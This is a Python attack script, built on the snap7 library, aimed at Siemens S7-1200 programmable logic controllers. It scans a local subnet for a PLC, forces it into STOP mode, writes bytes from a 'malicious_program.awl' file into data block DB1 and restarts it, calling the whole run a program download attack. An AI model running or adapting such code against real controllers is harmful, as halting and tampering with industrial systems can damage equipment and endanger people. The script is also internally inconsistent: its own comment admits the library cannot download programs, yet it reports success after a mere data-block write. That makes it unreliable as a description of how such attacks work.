import snap7
from snap7.util import get_int, get_bool, set_bool
from snap7.client import Client
import socket
import struct

def find_plc_ip():
    """Scan network for an active Siemens S7 PLC."""
    ip_base = "192.168.0."  # Adjust network range if necessary

    for i in range(1, 255):  # Loop through IPs in the subnet
        ip = f"{ip_base}{i}"
        plc = Client()
        try:
            plc.connect(ip, 0, 1)  # Connect to S7-1200 (rack=0, slot=1)
            if plc.get_connected():
                print(f"[+] PLC found at: {ip}")
                plc.disconnect()
                return ip
        except:
            pass  # Ignore unreachable IPs

    print("[-] No PLC found on the network.")
    return None

def perform_program_download(plc_ip):
    """Perform program download attack on the Siemens S7 PLC."""
    print(f"[+] Connecting to PLC at {plc_ip}...")

    plc = Client()
    plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 for S7-1200

    if plc.get_connected():
        print("[+] Connected to PLC.")

        # Put PLC into STOP mode (required for full program download)
        print("[!] Changing PLC mode to STOP...")
        plc.set_plc_mode(snap7.types.Modes.Stop)

        # Simulate a rogue program download (Modify Controller Tasking)
        print("[!] Uploading malicious ladder logic...")
        with open("malicious_program.awl", "rb") as f:
            data = f.read()
        
        # The Snap7 library does not support program downloads directly,
        # but an attacker could manually craft an S7Comm packet.
        plc.db_write(1, 0, data[:200])  # Write malicious payload to DB1

        # Restore PLC operation
        print("[!] Restarting PLC...")
        plc.set_plc_mode(snap7.types.Modes.Run)

        plc.disconnect()
        print("[+] Attack completed successfully.")
    else:
        print("[-] Failed to connect to PLC.")

if __name__ == "__main__":
    # Step 1: Discover the PLC on the network
    plc_ip = find_plc_ip()

    if plc_ip:
        # Step 2: Deploy the attack
        perform_program_download(plc_ip)
    else:
        print("[-] No PLCs available for attack.")